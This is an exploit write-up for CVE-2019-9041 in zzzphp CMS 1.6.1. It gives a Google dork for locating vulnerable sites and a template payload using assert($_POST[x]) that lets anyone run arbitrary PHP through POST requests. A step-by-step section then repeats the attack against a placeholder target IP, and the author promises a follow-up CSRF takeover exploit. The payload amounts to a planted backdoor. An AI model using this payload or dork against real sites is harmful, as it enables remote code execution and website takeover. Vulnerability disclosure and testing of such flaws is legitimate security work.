# Exploit Title: dynamic code evaluation of zzzphp cms 1.6.1

# Google Dork: intext:"2015-2019 zzcms.com"

# Date: 24/02/2019

# Exploit Author: Yang Chenglong

# Vendor Homepage: http://www.zzzcms.com/index.html

# Software Link: http://115.29.55.18/zzzphp.zip

# Version: 1.6.1

# Tested on: windows/Linux,iis/apache

# CVE : CVE-2019-9041

Due to the failure of filtering function parserIfLabel() in inc/zzz_template.php, attackers can insert dynamic php code into the template file and leads to dynamic code evaluation.

Exploit:
login in to the admin panel, edit the template of search.html, insert the following code:

{if:assert($_POST[x])}phpinfo();{end if}

Visit the http://webroot/search/ and post data “x = phpinfo();”, the page will execute the php code “phpinfo()” as follow:
[1.png]

Remarks:
While the above exploit requires attackers to have the access to the admin panel, I will post another exploit by using csrf to acquire the control of website without access to the admin panel.


Instruction:

Preparation:

Obtain and Deploy the Software:
Download ZZZPHP CMS version 1.6.1 from this link.
Deploy the CMS on a server running Windows or Linux with either IIS or Apache.
Set Up Testing Environment:
Ensure you have admin credentials to log in to the CMS.

Log in to Admin Panel:

Navigate to the admin panel of the ZZZPHP CMS and log in with your admin credentials.
Go to the section where you can edit the template files, specifically search.html.

Insert the following code snippet into the template:
{if:assert($_POST[x])}phpinfo();{end if}

Save the changes made to the search.html template.
Post Data to Trigger Code Execution:

Use a tool like curl, Postman, or a simple HTML form to post data to the search/ endpoint of the CMS.

Make a POST request to http://<TARGET_IP>/search/ with the following data: x=phpinfo();
Visit http://<TARGET_IP>/search/ in your browser.
The page should execute the PHP code phpinfo() and display the PHP configuration details.